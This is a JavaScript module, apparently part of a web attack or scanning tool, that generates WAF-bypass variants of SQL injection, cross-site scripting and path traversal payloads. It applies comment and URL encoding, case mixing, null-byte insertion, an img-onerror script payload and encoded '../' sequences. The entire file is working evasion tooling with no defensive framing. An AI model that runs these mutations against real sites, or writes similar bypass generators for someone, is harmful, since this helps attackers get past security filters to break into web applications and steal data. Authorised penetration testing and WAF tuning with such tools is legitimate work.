// Mutation Engine (PRD §9.5e) — generates WAF-bypass variants for HIGH_INTEREST
// payloads. Pure function, no I/O.

const SQL_MUTATIONS = [
  (p) => p.replace(/ /g, '/**/'),
  (p) => p.replace(/ /g, '%20'),
  (p) => p.replace(/ /g, '+'),
  (p) => p.toUpperCase(),
  (p) => p.replace(/'/g, '"'),
  (p) => encodeURIComponent(p),
  (p) => p.replace('OR', '||').replace('AND', '&&'),
  (p) => p.replace(/ /g, '\t'),
  (p) => `/*${p}*/`,
  (p) => p.replace(/'/g, '%27'),
];

const XSS_MUTATIONS = [
  (p) => p.replace(/<script>/gi, '<ScRiPt>'),
  (p) => p.replace(/<script>/gi, '<scr\x00ipt>'),
  (p) => p.replace('alert', 'prompt'),
  (p) => p.replace('alert', 'confirm'),
  (p) => p.replace(/<script[^>]*>.*?<\/script>/gi, '<img src=x onerror=alert(1)>'),
  (p) => p.replace(/</g, '<'),
  (p) => `javascript:${p}`,
];

const TRAVERSAL_MUTATIONS = [
  (p) => p.replace(/\.\.\//g, '....//'),
  (p) => p.replace(/\.\.\//g, '..%2f'),
  (p) => p.replace(/\.\.\//g, '%2e%2e%2f'),
  (p) => p.replace(/\//g, '\\'),
];

const MUTATIONS_BY_TYPE = {
  sqli: SQL_MUTATIONS,
  auth_bypass: SQL_MUTATIONS,
  xss: XSS_MUTATIONS,
  path_traversal: TRAVERSAL_MUTATIONS,
};

/**
 * Generate bypass variants for a payload.
 * @param {string} payload
 * @param {string} attackType
 * @returns {string[]} unique variants (excluding the original)
 */
export function mutate(payload, attackType) {
  const fns = MUTATIONS_BY_TYPE[attackType] || SQL_MUTATIONS;
  const variants = new Set();
  for (const fn of fns) {
    try {
      const v = fn(payload);
      if (v && v !== payload) variants.add(v);
    } catch {
      // skip failed mutation
    }
  }
  return [...variants];
}
